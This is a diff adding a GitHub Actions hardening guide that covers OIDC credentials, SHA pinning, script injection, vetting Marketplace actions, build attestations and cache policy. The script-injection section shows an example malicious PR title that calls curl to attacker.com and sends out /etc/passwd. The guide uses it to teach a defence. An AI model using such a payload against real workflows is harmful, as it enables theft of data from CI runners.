+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
+          aws-region: us-east-1
+          # No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY needed!
+
+      - run: aws s3 ls
+```
+
+**Azure example:**
+
+```yaml
+jobs:
+  deploy:
+    permissions:
+      id-token: write
+      contents: read
+    runs-on: ubuntu-latest
+    steps:
+      - uses: azure/login@v2
+        with:
+          client-id: ${{ secrets.AZURE_CLIENT_ID }}
+          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+          # Uses OIDC federation — no client secret stored!
+
+      - run: az account show
+```
+
+**Trust policy on the cloud side (AWS IAM role trust policy):**
+
+```json
+{
+  "Condition": {
+    "StringEquals": {
+      "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main",
+      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
+    }
+  }
+}
+```
+
+> Lock the trust policy to specific repositories, branches, and environments to prevent abuse.
+
+---
+
+### 3. **Pinning Actions to Full Commit SHAs**
+
+Using `@v4` or `@main` for actions means the action code could change without warning. Pinning to a **full commit SHA** guarantees immutability.
+
+```yaml
+steps:
+  # ❌ Mutable — action could change at any time
+  - uses: actions/checkout@v4
+  - uses: actions/checkout@main
+
+  # ✅ Immutable — pinned to exact commit
+  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+  - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
+```
+
+**Finding the SHA for a release tag:**
+
+```bash
+# Using gh CLI
+gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq '.object.sha'
+
+# Or: look up the commit in the action's releases page on GitHub
+```
+
+**Immutable actions enforcement on hosted runners:**
+
+GitHub has introduced a policy where GitHub-hosted runners can enforce that only immutable (SHA-pinned) action references are permitted. When enabled at the organization or enterprise level, workflows using `@v4` or `@main` will fail unless the action is also in the allow list.
+
+---
+
+### 4. **Script Injection Mitigation**
+
+Script injection occurs when untrusted user-controlled data (e.g., PR titles, issue bodies, commit messages) is interpolated directly into a `run:` step's shell script.
+
+**Vulnerable pattern:**
+
+```yaml
+# ❌ VULNERABLE — PR title is user-controlled and could contain
+# shell metacharacters or injected commands
+- name: Process PR
+  run: |
+    echo "PR title: ${{ github.event.pull_request.title }}"
+    ./process.sh "${{ github.event.pull_request.body }}"
+```
+
+An attacker could submit a PR with a title like:
+
+```
+My PR"; curl https://attacker.com/exfil?data=$(cat /etc/passwd); echo "
+```
+
+**Safe pattern — use environment variables:**
+
+```yaml
+# ✅ SAFE — value is passed as an env var, not interpolated into the script
+- name: Process PR
+  env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+    PR_BODY: ${{ github.event.pull_request.body }}
+  run: |
+    echo "PR title: $PR_TITLE"
+    ./process.sh "$PR_BODY"
+```
+
+The shell receives the literal value of `PR_TITLE` without any expression evaluation of shell metacharacters.
+
+**High-risk contexts to avoid direct interpolation of:**
+
+- `github.event.pull_request.title`
+- `github.event.pull_request.body`
+- `github.event.issue.title`
+- `github.event.issue.body`
+- `github.event.comment.body`
+- `github.event.commits[*].message`
+- `github.head_ref` (branch names can contain special chars)
+- Any `repository_dispatch` or `workflow_dispatch` inputs from external callers
+
+---
+
+### 5. **Identifying Trustworthy Marketplace Actions**
+
+Not all Marketplace actions are equally safe. Use these criteria:
+
+| Signal                     | What to look for                                                           |
+| -------------------------- | -------------------------------------------------------------------------- |
+| **Verified creator badge** | GitHub-verified organizations (blue check on Marketplace)                  |
+| **Owned by known org**     | `actions/`, `github/`, major cloud providers, well-known OSS orgs          |
+| **Source transparency**    | Action's repository is public; `action.yml` clearly maps inputs/outputs    |
+| **Pinned SHA usage**       | Action's own workflows and documentation recommend SHA pinning             |
+| **Stars and adoption**     | Wide community use is a signal (not a guarantee)                           |
+| **Recent maintenance**     | Active commit history; security vulnerabilities addressed promptly         |
+| **Minimal permissions**    | Action requests only the permissions it needs                              |
+| **No suspicious `runs:`**  | For JavaScript actions, review `main:` entry point source for exfiltration |
+
+**For critical workflows, review the action's source code** before adding it. A compromised or malicious action runs with your `GITHUB_TOKEN` and any secrets you inject.
+
+---
+
+### 6. **Artifact Attestations and SLSA Provenance**
+
+Artifact attestations create a cryptographically verifiable link between a build artifact and the workflow run that produced it, implementing **SLSA (Supply-chain Levels for Software Artifacts)** provenance.
+
+**Generating an attestation:**
+
+```yaml
+jobs:
+  build:
+    permissions:
+      id-token: write # required for OIDC signing
+      attestations: write # required to create attestations
+      contents: read
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Build artifact
+        run: |
+          npm ci
+          npm run build
+          tar czf myapp-${{ github.sha }}.tar.gz dist/
+
+      - uses: actions/attest-build-provenance@v2
+        with:
+          subject-path: myapp-${{ github.sha }}.tar.gz
+```
+
+This creates an attestation stored in GitHub's transparency log that records:
+
+- The exact commit SHA
+- The workflow ref and job name
+- The runner environment
+- A cryptographic signature
+
+**Verifying an attestation:**
+
+```bash
+# Install the gh CLI, then:
+gh attestation verify myapp-abc123.tar.gz \
+  --repo myorg/myapp \
+  --signer-workflow .github/workflows/build.yml
+```
+
+**SLSA levels:**
+
+- **SLSA Level 1** — Provenance exists (documents how artifact was built)
+- **SLSA Level 2** — Signed provenance (tamper-evident using OIDC + Sigstore)
+- **SLSA Level 3** — Hardened build environment (GitHub-hosted runners qualify)
+
+`attest-build-provenance` targeting GitHub-hosted runners achieves **SLSA Level 3** out of the box.
+
+---
+
+### 7. **Dependency Policy: Caching and Artifact Retention**
+
+Security and cost optimization both benefit from thoughtful cache and artifact policies.
+
+**Cache key hygiene:**
+
+```yaml
+# Pin cache to lock file hash — ensures stale deps don't persist
+- uses: actions/cache@v4
+  with:
+    path: ~/.npm
+    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
+    restore-keys: |
+      npm-${{ runner.os }}-
+
+# Never cache secrets or credentials
+# ❌ Do NOT cache:
+#   ~/.aws/credentials
+#   ~/.config/gcloud
+#   ~/.kube/config
+```
+
+**Artifact retention:**
+
+```yaml
+- uses: actions/upload-artifact@v4
+  with:
+    name: build-output
+    path: dist/
+    retention-days: 7 # default is 90; reduce for transient build artifacts
+    if-no-files-found: error
+```
+
+Artifacts can be deleted via API to manage storage costs:
+
+```bash
+curl -X DELETE \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/artifacts/ARTIFACT_ID
 ```
 
 ---
